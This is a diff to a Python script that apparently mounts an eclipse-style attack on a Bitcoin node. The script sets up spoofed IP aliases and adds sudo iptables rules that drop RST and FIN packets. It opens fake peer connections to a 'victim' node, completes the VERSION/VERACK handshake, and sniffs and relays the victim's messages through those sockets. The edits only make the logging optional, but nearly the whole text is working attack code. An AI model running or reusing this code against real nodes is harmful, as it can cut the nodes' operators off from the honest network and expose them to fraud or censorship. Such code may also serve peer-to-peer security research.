@@ -105,63 +105,64 @@ def close_connection(index):
 	print(f'Socket for ({ip} : {port}) successfully closed')
 
 # Creates a fake connection to the victim
-def make_fake_connection(src_ip, dst_ip):
+def make_fake_connection(src_ip, dst_ip, verbose=True):
 	src_port = random.randint(1024, 65535)
 	dst_port = victim_port
 	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')
 
 	spoof_interface = ip_alias(src_ip)
 	spoof_IP_interface.append((spoof_interface, src_ip))
-	print(f'Successfully set up IP alias on interface {spoof_interface}')
-	print('Resulting ifconfig interface:')
-	print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
+	if verbose: print(f'Successfully set up IP alias on interface {spoof_interface}')
+	if verbose: print('Resulting ifconfig interface:')
+	if verbose: print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')
 
-	print('Setting up iptables configurations')
+	if verbose: print('Setting up iptables configurations')
 	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
 	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
 	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN -j DROP')
 	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST -j DROP')
 
-	print('Creating network socket...')
+	if verbose: print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	
-	print(f'Setting socket network interface to "{network_interface}"...')
+	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
 	
-	print(f'Binding socket to ({src_ip} : {src_port})...')
+	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
 	s.bind((src_ip, src_port))
 
-	print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
+	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
 	s.connect((dst_ip, dst_port))
 
 	# Send version packet
-	print('\nSending VERSION packet')
+	if verbose: print('\nSending VERSION packet')
 	version = version_packet(src_ip, dst_ip, src_port, dst_port)
 	print(version)
 	s.send(version.to_bytes())
 
 	# Get verack packet
-	print('\nReceiving VERACK packet')
-	print(s.recv(1924)) # Next message received must be <= 1924 bytes
+	if verbose: print('\nReceiving VERACK packet')
+	verack = s.recv(1924)
+	if verbose: print(verack) # Next message received must be <= 1924 bytes
 	
 	# Send verack packet
-	print('\nSending VERACK packet')
+	if verbose: print('\nSending VERACK packet')
 	verack = msg_verack()
-	print(verack)
+	if verbose: print(verack)
 	s.send(verack.to_bytes())
 
 	# Get verack packet
-	print('\nReceiving VERACK packet')
-	print(s.recv(1024)) # Next message received must be <= 1024 bytes
+	if verbose: print('\nReceiving VERACK packet')
+	if verbose: print(s.recv(1024)) # Next message received must be <= 1024 bytes
 
-	print('\n\n')
-	print('* CONNECTION SUCCESSFULLY ESTABLISHED *')
+	if verbose: print('\n\n')
+	if verbose: print('* CONNECTION SUCCESSFULLY ESTABLISHED *')
 
 	spoof_IP_and_ports.append((src_ip, src_port))
 	spoof_IP_sockets.append(s)
 
 	# Listen to the connections for future packets
-	print('Attaching packet listener for future messages...')
+	if verbose: print('Attaching packet listener for future messages...')
 	try:
 		start_new_thread(sniff, (), {
 			'iface': spoof_interface,
@@ -183,7 +184,7 @@ def packet_received(packet):
 
 	# Extract the message type
 	msgtype = packet.load[4:16].decode()
-	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')
+	print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')
 
 	# Relay Bitcoin packets that aren't from the victim
 	if packet[IP].dst == attacker_ip and packet[IP].src == victim_ip:
@@ -201,7 +202,7 @@ def packet_received(packet):
 				rand_port = spoof_IP_and_ports[rand_i][1]
 				rand_socket = spoof_IP_sockets[rand_i]
 
-				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
+				#print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
 				#packet[IP].src = rand_ip
 				#packet[IP].dst = victim_ip
 
@@ -221,7 +222,7 @@ def packet_received(packet):
 				except Exception as e:
 					print("Closing socket because of error: " + str(e))
 					close_connection(rand_i)
-					make_fake_connection(rand_ip, victim_ip) # Use old IP
+					make_fake_connection(rand_ip, victim_ip, False) # Use old IP
 					#make_fake_connection(random_ip(), victim_ip)
 					sys.exit() # Stop the current thread that sniffs for packets on this interface
 
